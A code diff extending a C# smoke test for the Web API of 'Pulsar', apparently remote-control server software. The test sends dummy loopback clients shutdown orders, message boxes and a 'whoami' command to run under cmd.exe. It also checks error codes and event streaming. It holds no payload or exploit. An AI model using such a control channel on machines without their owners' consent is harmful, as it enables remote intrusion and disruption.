@@ -1,5 +1,18 @@
+using Pulsar.Common.Enums;
+using Pulsar.Common.Messages.Administration.Actions;
+using Pulsar.Common.Messages.Other;
+using Pulsar.Common.Messages.QuickCommands;
+using Pulsar.Common.Messages.UserSupport.MessageBox;
+using Pulsar.Common.Networking;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Networking.WebApi;
+using Pulsar.Server.Models;
+using Pulsar.Server.Persistence;
+using System.Collections.Concurrent;
+using System.Net;
+using System.Net.Sockets;
+using System.Buffers.Binary;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 
 // Smoke test for the embedded Web API v2: starts the real WebApiServer with no clients
@@ -11,7 +24,10 @@ const string apiKey = "smoke-test-key-123";
 
 var failures = new List<string>();
 
-var api = new WebApiServer(() => Array.Empty<Client>(), (m, l) => Console.WriteLine($"[log:{l}] {m}"));
+var connectedClients = new ConcurrentDictionary<string, Client>();
+WebApiServer api = new WebApiServer(
+    () => connectedClients.Values.ToArray(),
+    (m, l) => Console.WriteLine($"[log:{l}] {m}"));
 if (!api.Start((ushort)port, apiKey))
 {
     Console.WriteLine("FAIL: server did not start");
@@ -85,11 +101,18 @@ await Check("GET /api/clients/unknownid → 404", async () =>
     return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
 }, 404, "not found");
 
-await Check("POST /api/clients/unknownid/shutdown → 404", async () =>
+const string unknownClientId = "0000000000000000000000000000000000000000000000000000000000000000";
+await Check("POST /api/clients/{valid unknown id}/shutdown → 404", async () =>
 {
-    using var r = await http.SendAsync(Post("/api/clients/unknownid/shutdown"));
+    using var r = await http.SendAsync(Post($"/api/clients/{unknownClientId}/shutdown"));
     return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
 }, 404, "not found");
+
+await Check("POST /api/clients/x/shutdown → 400", async () =>
+{
+    using var r = await http.SendAsync(Post("/api/clients/x/shutdown"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 400, "invalid client id");
 
 await Check("POST /api/clients/x/quickcommand no command → 400", async () =>
 {
@@ -150,7 +173,143 @@ await Check("GET /dashboard → 200 html", async () =>
     return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
 }, 200, "Pulsar Dashboard");
 
-// SSE: connect, receive hello event within 5s, then a published log event, then close
+const string onlineClientId = "1111111111111111111111111111111111111111111111111111111111111111";
+const string offlineClientId = "2222222222222222222222222222222222222222222222222222222222222222";
+var onlineCertificate = new DummyCertificate();
+var onlineStream = new CaptureStream();
+var onlineClient = CreateClient(onlineClientId, onlineCertificate, onlineStream);
+connectedClients[onlineClientId] = onlineClient;
+
+await Check("GET /api/clients → shared full client projection", async () =>
+{
+    using var r = await http.SendAsync(Get("/api/clients"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, onlineClientId);
+
+await Check("GET /api/clients/{id} → detail matches list projection", async () =>
+{
+    using var r = await http.SendAsync(Get($"/api/clients/{onlineClientId}"));
+    string body = await r.Content.ReadAsStringAsync();
+    return ((int)r.StatusCode, body);
+}, 200, "\"connected\":true");
+
+await Check("POST shutdown → accepted through shared operation layer", async () =>
+{
+    using var r = await http.SendAsync(Post($"/api/clients/{onlineClientId}/shutdown"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, "\"sent\":true");
+
+var shutdown = await WaitForMessage<DoShutdownAction>(onlineStream, onlineCertificate);
+if (shutdown?.Action != ShutdownAction.Shutdown)
+{
+    failures.Add("shutdown-wire");
+    Console.WriteLine("FAIL shutdown message did not preserve DoShutdownAction.Shutdown");
+}
+else
+{
+    Console.WriteLine("PASS shutdown wire compatibility → DoShutdownAction.Shutdown");
+}
+
+await Check("POST quickcommand → existing wire message accepted", async () =>
+{
+    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/quickcommand")
+    {
+        Content = new StringContent("{\"command\":\"whoami\",\"host\":\"cmd.exe\"}", Encoding.UTF8, "application/json")
+    };
+    request.Headers.Add("X-Api-Key", apiKey);
+    using var r = await http.SendAsync(request);
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, "\"sent\":true");
+
+var quickCommand = await WaitForMessage<DoSendQuickCommand>(onlineStream, onlineCertificate);
+if (quickCommand?.Command != "whoami" || quickCommand.Host != "cmd.exe")
+{
+    failures.Add("quickcommand-wire");
+    Console.WriteLine("FAIL quickcommand wire fields changed");
+}
+else
+{
+    Console.WriteLine("PASS quickcommand wire fields preserved");
+}
+
+await Check("POST messagebox → defaults and wire message preserved", async () =>
+{
+    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/messagebox")
+    {
+        Content = new StringContent("{\"text\":\"hello\"}", Encoding.UTF8, "application/json")
+    };
+    request.Headers.Add("X-Api-Key", apiKey);
+    using var r = await http.SendAsync(request);
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, "\"sent\":true");
+
+var messageBox = await WaitForMessage<DoShowMessageBox>(onlineStream, onlineCertificate);
+if (messageBox?.Text != "hello" || messageBox.Caption != null ||
+    messageBox.Button != "OK" || messageBox.Icon != "Information")
+{
+    failures.Add("messagebox-wire");
+    Console.WriteLine("FAIL messagebox wire/default fields changed");
+}
+else
+{
+    Console.WriteLine("PASS messagebox wire/default fields preserved");
+}
+
+var offlineCertificate = new DummyCertificate();
+var offlineStream = new CaptureStream();
+var offlineClient = CreateClient(offlineClientId, offlineCertificate, offlineStream);
+OfflineClientRepository.UpsertClient(offlineClient);
+OfflineClientRepository.MarkClientOffline(offlineClient);
+offlineClient.Disconnect();
+
+await Check("GET detail for known offline client → 200 connected:false", async () =>
+{
+    using var r = await http.SendAsync(Get($"/api/clients/{offlineClientId}"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, "\"connected\":false");
+
+await Check("POST action for known offline client → 409", async () =>
+{
+    using var r = await http.SendAsync(Post($"/api/clients/{offlineClientId}/shutdown"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 409, "offline");
+
+await Check("POST messagebox with invalid choice → 400", async () =>
+{
+    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/messagebox")
+    {
+        Content = new StringContent("{\"text\":\"hello\",\"icon\":\"Invalid\"}", Encoding.UTF8, "application/json")
+    };
+    request.Headers.Add("X-Api-Key", apiKey);
+    using var r = await http.SendAsync(request);
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 400, "invalid request");
+
+await Check("Unsupported action remains outside command surface", async () =>
+{
+    using var r = await http.SendAsync(Post($"/api/clients/{onlineClientId}/unsupported"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 404);
+
+await Check("GET /api/offline → same projection as detail", async () =>
+{
+    using var r = await http.SendAsync(Get("/api/offline"));
+    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
+}, 200, offlineClientId);
+
+await Check("Dashboard has full IDs, timeout mapping, and 5s SSE retry", async () =>
+{
+    using var r = await http.SendAsync(Get("/", false));
+    string body = await r.Content.ReadAsStringAsync();
+    bool ok = body.Contains("class=\"mono dim client-id\"", StringComparison.Ordinal)
+        && body.Contains("REQUEST_TIMEOUT_MS = 10000", StringComparison.Ordinal)
+        && body.Contains("SSE_RETRY_MS = 5000", StringComparison.Ordinal)
+        && body.Contains("request timed out", StringComparison.Ordinal)
+        && !body.Contains("slice(0, 8)", StringComparison.Ordinal);
+    return (ok ? 200 : 500, body);
+}, 200);
+
+// SSE: connect, receive current state and retry directive, then a live log event.
 var sseOk = false;
 var sseSawLogEvent = false;
 try
@@ -163,8 +322,10 @@ try
         await using var stream = await resp.Content.ReadAsStreamAsync(cts.Token);
         using var reader = new StreamReader(stream);
         var sawHello = false;
+        var sawRetry = false;
+        var published = false;
         var deadline = Task.Delay(TimeSpan.FromSeconds(4));
-        while (!deadline.IsCompleted)
+        while (!deadline.IsCompleted && !sseSawLogEvent)
         {
             var readLine = reader.ReadLineAsync(cts.Token).AsTask();
             var finished = await Task.WhenAny(readLine, deadline);
@@ -174,23 +335,113 @@ try
             if (line.StartsWith("data:", StringComparison.Ordinal))
             {
                 string json = line.Substring(5).Trim();
-                if (json.Contains("\"hello\"")) sawHello = true;
-                if (json.Contains("\"Web API listening")) sseSawLogEvent = true; // buffered? no - live only
+                if (json.Contains("\"hello\"") && json.Contains(onlineClientId, StringComparison.Ordinal))
+                    sawHello = true;
+                if (sawHello && !published)
+                {
+                    published = true;
+                    api.PublishLog("Web API smoke live event", "info");
+                }
+                if (json.Contains("Web API smoke live event", StringComparison.Ordinal))
+                    sseSawLogEvent = true;
             }
-            if (sawHello)
+            if (line.StartsWith("retry: 5000", StringComparison.Ordinal))
             {
-                // trigger a log publish through a version fetch? version endpoint doesn't log.
-                // The hello itself + retry line is sufficient proof of the stream protocol.
-                break;
+                sawRetry = true;
             }
         }
-        sseOk = sawHello;
+        sseOk = sawHello && sawRetry && sseSawLogEvent;
     }
 }
 catch (OperationCanceledException) { /* timeout is fine */ }
-Console.WriteLine($"{(sseOk ? "PASS" : "FAIL")} SSE /api/events → hello event received (type text/event-stream)");
+Console.WriteLine($"{(sseOk ? "PASS" : "FAIL")} SSE /api/events → state + retry + live event");
 if (!sseOk) failures.Add("sse-hello");
 
+OfflineClientRepository.RemoveOfflineClients(new[] { offlineClientId });
+onlineClient.Disconnect();
 api.Dispose();
 Console.WriteLine(failures.Count == 0 ? "ALL PASS" : $"FAILED: {failures.Count} — {string.Join(", ", failures)}");
 return failures.Count == 0 ? 0 : 1;
+
+static Client CreateClient(string id, X509Certificate2 certificate, CaptureStream stream)
+{
+    var client = new Client(stream, new IPEndPoint(IPAddress.Loopback, 50000), certificate)
+    {
+        Value =
+        {
+            Id = id,
+            Username = "smoke-user",
+            PcName = "smoke-pc",
+            PublicIP = "127.0.0.1",
+            Country = "Smoke",
+            CountryCode = "SM",
+            Tag = "integration",
+            OperatingSystem = "test",
+            Version = "test",
+            AccountType = "User"
+        }
+    };
+    client.Identified = true;
+    return client;
+}
+
+static async Task<T> WaitForMessage<T>(CaptureStream stream, X509Certificate2 certificate)
+    where T : class, IMessage
+{
+    var deadline = DateTime.UtcNow + TimeSpan.FromSeconds(3);
+    while (DateTime.UtcNow < deadline)
+    {
+        if (stream.Messages.TryDequeue(out byte[] frame))
+        {
+            int length = BinaryPrimitives.ReadInt32LittleEndian(frame);
+            byte[] payload = frame.AsSpan(4, length).ToArray();
+            IMessage message = PulsarMessagePackSerializer.Deserialize(payload);
+            if (message is SecureMessageEnvelope envelope)
+                message = SecureMessageEnvelopeHelper.Unwrap(envelope, certificate);
+            return message as T;
+        }
+        await Task.Delay(10);
+    }
+    return null;
+}
+
+sealed class CaptureStream : Stream
+{
+    public ConcurrentQueue<byte[]> Messages { get; } = new ConcurrentQueue<byte[]>();
+    private readonly NeverAsyncResult _read = new NeverAsyncResult();
+
+    public override bool CanRead => true;
+    public override bool CanSeek => false;
+    public override bool CanWrite => true;
+    public override bool CanTimeout => true;
+    public override int ReadTimeout { get; set; } = 30000;
+    public override int WriteTimeout { get; set; } = 10000;
+    public override long Length => 0;
+    public override long Position { get => 0; set => throw new NotSupportedException(); }
+    public override void Flush() { }
+    public override int Read(byte[] buffer, int offset, int count) => 0;
+    public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
+    public override void SetLength(long value) => throw new NotSupportedException();
+    public override void Write(byte[] buffer, int offset, int count)
+    {
+        var frame = new byte[count];
+        Buffer.BlockCopy(buffer, offset, frame, 0, count);
+        Messages.Enqueue(frame);
+    }
+
+    public override IAsyncResult BeginRead(byte[] buffer, int offset, int count, AsyncCallback callback, object state)
+    {
+        return _read;
+    }
+
+    public override int EndRead(IAsyncResult asyncResult) => throw new InvalidOperationException();
+}
+
+sealed class NeverAsyncResult : IAsyncResult
+{
+    private readonly ManualResetEvent _waitHandle = new ManualResetEvent(false);
+    public object AsyncState => null;
+    public WaitHandle AsyncWaitHandle => _waitHandle;
+    public bool CompletedSynchronously => false;
+    public bool IsCompleted => false;
+}
